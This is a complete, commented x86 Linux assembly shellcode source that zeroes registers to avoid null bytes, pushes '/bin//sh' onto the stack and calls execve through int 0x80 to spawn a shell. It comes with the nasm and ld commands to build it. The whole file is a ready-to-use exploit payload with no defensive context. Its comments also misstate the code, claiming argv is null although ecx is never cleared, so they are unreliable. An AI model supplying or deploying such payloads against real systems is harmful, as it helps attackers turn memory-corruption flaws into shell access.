; nasm -felf32 shellcode.asm && ld -melf_i386 shellcode.o -o shellcode
section .text
global _start
_start:
xor    edx,edx    ;it will be used as *envp = NULL, cannot be omitted!
xor    eax,eax    ;it will be used as a null-terminating char
push   eax
push   0x68732f2f
push   0x6e69622f ;here you got /bin//sh\x00 on the stack
mov    ebx,esp    ;ebx <- esp; ebx points to /bin//sh\x00
mov    al,0xb     ;al = 0xb, 11, execve syscall id
int    0x80       ;execve("/bin//sh\x00",Null,Null)
